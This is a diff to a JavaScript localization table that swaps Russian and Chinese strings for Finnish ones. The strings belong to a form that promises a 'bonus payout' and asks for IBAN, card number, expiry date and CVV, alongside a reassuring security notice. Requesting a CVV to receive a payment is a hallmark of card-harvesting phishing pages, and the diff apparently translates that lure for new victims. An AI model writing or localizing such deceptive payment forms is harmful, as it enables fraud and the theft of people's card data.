@@ -389,65 +389,36 @@ const LANGS = {
     }
   },
 
-  ru:{ name:"Русский",
-    title:"На какой счёт перечислить премию?",
-    sub:"Введите платёжные данные, чтобы мы корректно обработали выплату.",
-    labels:{ iban:"IBAN", holder:"ДЕРЖАТЕЛЬ КАРТЫ", card:"НОМЕР КАРТЫ", exp:"СРОК", cvv:"CVV" },
-    notice:"Примечание по безопасности: платёжные данные обрабатываются только для выплаты премии.",
-    cont:"Продолжить",
-    placeholders:{ holder:"Иван Иванов", card:"1234 5678 9012 3456", exp:"MM/ГГ", cvv:"123" },
-    errors:{
-      iban_required:"Требуется IBAN.",
-      iban_format:"Неверный формат IBAN.",
-      iban_invalid:"IBAN недействителен.",
+  fi:{
+  name:"Suomi",
+  title:"Mille tilille bonus maksetaan?",
+  sub:"Syötä maksutiedot, jotta voimme käsitellä maksun oikein.",
+  labels:{ iban:"IBAN", holder:"KORTINHALTIJA", card:"KORTIN NUMERO", exp:"VOIMASSA", cvv:"CVV" },
+  notice:"Turvahuomautus: maksutietoja käytetään vain bonuksen maksamiseen.",
+  cont:"Jatka",
+  placeholders:{ holder:"Matti Meikäläinen", card:"1234 5678 9012 3456", exp:"KK/VV", cvv:"123" },
+  errors:{
+    iban_required:"IBAN vaaditaan.",
+    iban_format:"Virheellinen IBAN-muoto.",
+    iban_invalid:"IBAN ei ole kelvollinen.",
 
-      holder_required:"Требуется имя.",
-      holder_chars:"В имени допускаются только буквы.",
-      holder_two:"Нужны имя и фамилия.",
+    holder_required:"Nimi vaaditaan.",
+    holder_chars:"Nimessä saa olla vain kirjaimia.",
+    holder_two:"Anna etu- ja sukunimi.",
 
-      card_required:"Требуется номер карты.",
-      card_len:"Неверная длина номера карты.",
-      card_invalid:"Номер карты недействителен.",
+    card_required:"Kortin numero vaaditaan.",
+    card_len:"Kortin numeron pituus on virheellinen.",
+    card_invalid:"Kortin numero ei ole kelvollinen.",
 
-      exp_required:"Требуется срок действия.",
-      exp_format:"Требуется формат MM/ГГ.",
-      exp_month:"Неверный месяц.",
-      exp_past:"Срок действия карты истёк.",
+    exp_required:"Voimassaoloaika vaaditaan.",
+    exp_format:"Muodon tulee olla KK/VV.",
+    exp_month:"Virheellinen kuukausi.",
+    exp_past:"Kortti on vanhentunut.",
 
-      cvv_required:"Требуется CVV.",
-      cvv_len:"CVV должен содержать 3 цифры."
-    }
-  },
-
-  zhCN:{ name:"简体中文",
-    title:"奖金要汇入哪个账户？",
-    sub:"请输入支付信息，以便我们正确处理奖金发放。",
-    labels:{ iban:"IBAN", holder:"持卡人", card:"卡号", exp:"有效期", cvv:"CVV" },
-    notice:"安全提示：你的支付信息仅用于处理奖金发放。",
-    cont:"继续",
-    placeholders:{ holder:"张三", card:"1234 5678 9012 3456", exp:"MM/YY", cvv:"123" },
-    errors:{
-      iban_required:"需要填写 IBAN。",
-      iban_format:"IBAN 格式无效。",
-      iban_invalid:"IBAN 无效。",
-
-      holder_required:"需要填写姓名。",
-      holder_chars:"姓名只能包含字母。",
-      holder_two:"需要填写名和姓。",
-
-      card_required:"需要填写卡号。",
-      card_len:"卡号长度无效。",
-      card_invalid:"卡号无效。",
-
-      exp_required:"需要填写有效期。",
-      exp_format:"需要 MM/YY 格式。",
-      exp_month:"月份无效。",
-      exp_past:"卡已过期。",
-
-      cvv_required:"需要填写 CVV。",
-      cvv_len:"CVV 必须是 3 位数字。"
-    }
+    cvv_required:"CVV vaaditaan.",
+    cvv_len:"CVV:n tulee olla 3 numeroa."
   }
+}
 };
 
 let current = localStorage.getItem(STORAGE_KEY_LANG) || "de";
